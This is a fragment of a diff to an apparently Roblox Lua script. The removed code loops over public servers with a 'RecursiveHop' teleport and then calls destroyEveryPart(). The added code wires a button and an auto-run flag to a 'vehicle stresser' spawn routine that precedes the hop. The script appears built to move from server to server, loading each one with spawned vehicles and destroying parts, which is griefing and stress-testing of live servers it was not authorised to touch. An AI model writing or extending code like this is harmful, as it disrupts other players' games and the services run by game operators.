+        -- server, it will fall through to destroyEveryPart + showDone.
+        startRecursiveHop()
+    end)
+end
+
+runButton.Activated:Connect(function()
+    if not isCurrentRun() then return end
+    task.spawn(runSpawn)
+end)
 
 --==============================================================
 -- MAIN
 --==============================================================
+task.wait(INITIAL_DELAY)
 
-task.wait(
-    INITIAL_DELAY
-)
-
-
---==============================================================
--- KEEP TRYING UNTIL A TELEPORT STARTS
---==============================================================
-
-local attempts = 0
-
-while true do
-
-    attempts += 1
-
-    if attempts > 50 then
-
-        warn(
-            "[RecursiveHop] Too many failed server attempts."
-        )
-
-        break
-    end
-
-
-    local target =
-        chooseServer()
-
-
-    if not target then
-
-        print(
-            "[RecursiveHop] No unvisited public servers found."
-        )
-
-        break
-    end
-
-
-    local success =
-        teleportToServer(
-            target
-        )
-
-
-    if success then
-
-        -- Once the teleport begins, this copy of the script
-        -- is expected to leave this server.
-        return
-    end
-
-    -- The target failed. Find a different one.
-    task.wait(0.5)
+if AUTO_RUN_VEHICLE_SPAWNER then
+    print("[Merged] Auto-starting vehicle stresser...")
+    task.spawn(runSpawn)
 end
-
-
---==============================================================
--- EXHAUSTED
---==============================================================
-
-task.wait(0.5)
-
-destroyEveryPart()
-
-showDone()
-
-print(
-    "[RecursiveHop] done."
-)
